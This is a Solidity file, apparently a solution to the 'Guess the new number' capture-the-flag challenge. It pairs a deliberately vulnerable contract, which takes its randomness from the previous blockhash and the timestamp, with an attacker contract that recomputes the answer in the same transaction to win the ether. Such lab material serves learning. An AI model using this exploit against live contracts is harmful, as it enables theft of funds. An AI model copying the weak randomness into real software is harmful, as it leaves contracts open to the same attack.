/**
 *Submitted for verification at Etherscan.io on 2022-03-23
*/

pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract CallingTheNewNumber {
    //uint8 answer;
    address GuessTheNewNumberChallengeAddress =
        0x5926AB0659C8B463879F3CE88911b221DBe6A731;

    GuessTheNewNumberChallenge challenge =
        GuessTheNewNumberChallenge(GuessTheNewNumberChallengeAddress);

    //bytes32 ParentHash = 0x095ee62a5811a827cb600fccee4a785ba2885213aac97574c2a7c5515f15db69;
    //uint timeStamp = 1648030330;
    function gessing() public payable {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        challenge.guess.value(msg.value)(answer);
    }
}